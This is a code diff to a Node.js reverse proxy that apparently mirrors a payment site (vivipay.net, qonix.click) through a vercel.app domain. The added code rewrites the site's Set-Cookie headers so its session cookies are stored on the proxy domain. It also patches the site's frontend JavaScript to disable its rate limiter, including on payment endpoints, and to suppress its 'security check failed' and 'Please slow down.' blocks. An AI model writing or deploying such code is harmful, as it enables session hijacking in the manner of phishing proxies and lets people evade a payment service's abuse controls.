@@ -1643,9 +1643,22 @@ app.all('*', async (req, res) => {
     // Pass through response headers (skip hop-by-hop)
     const skipHeaders = new Set(['transfer-encoding','connection','content-encoding','content-length','keep-alive']);
     response.headers.forEach((val, key) => {
-      if (!skipHeaders.has(key.toLowerCase())) {
-        res.setHeader(key, val);
+      const kl = key.toLowerCase();
+      if (skipHeaders.has(kl)) return;
+
+      // Rewrite Set-Cookie: strip Domain so browser stores cookies for our proxy domain
+      // This fixes "security check failed" in incognito — vivipay.net session cookies get
+      // stored for rtyhh.vercel.app and are forwarded back to vivipay.net on every request
+      if (kl === 'set-cookie') {
+        val = val.replace(/;\s*[Dd]omain=[^;]+/gi, '');
+        val = val.replace(/;\s*SameSite=(?:Strict|Lax)/gi, '; SameSite=None');
+        if (!/SameSite/i.test(val)) val = val.trimEnd() + '; SameSite=None';
+        if (/SameSite=None/i.test(val) && !/;\s*Secure/i.test(val)) val += '; Secure';
+        res.append('set-cookie', val);
+        return;
       }
+
+      res.setHeader(key, val);
     });
 
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -1685,6 +1698,8 @@ app.all('*', async (req, res) => {
       }
 
       const buf = Buffer.from(html, 'utf-8');
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
+      res.setHeader('Pragma', 'no-cache');
       res.setHeader('content-type', 'text/html; charset=utf-8');
       res.setHeader('content-length', String(buf.length));
       res.status(response.status).end(buf);
@@ -1699,14 +1714,18 @@ app.all('*', async (req, res) => {
       js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
 
       // Patch frontend rate limiter — "Please slow down." blocker
-      // Original: API_HTTP_WINDOW_MS=1e3, API_HTTP_DEFAULT_MAX_PER_WINDOW=1
-      // Setting window to 0ms effectively disables the throttle
-      js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=0');
-      js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=0');
-      js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=999');
+      // Use 999999999 (not 0) — 0 is falsy, some code paths do `windowMs || 1000`
+      js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
+      js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=999999999');
+      js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=9999');
+      js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
+      js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
       js = js.replace(/API_HTTP_RATE_LIMIT_MSG\s*=\s*"Please slow down\."/g, 'API_HTTP_RATE_LIMIT_MSG=""');
 
       const buf = Buffer.from(js, 'utf-8');
+      // Force no-cache so browser always fetches fresh patched JS (never serves old cached version)
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
+      res.setHeader('Pragma', 'no-cache');
       res.setHeader('content-type', ct);
       res.setHeader('content-length', String(buf.length));
       res.status(response.status).end(buf);
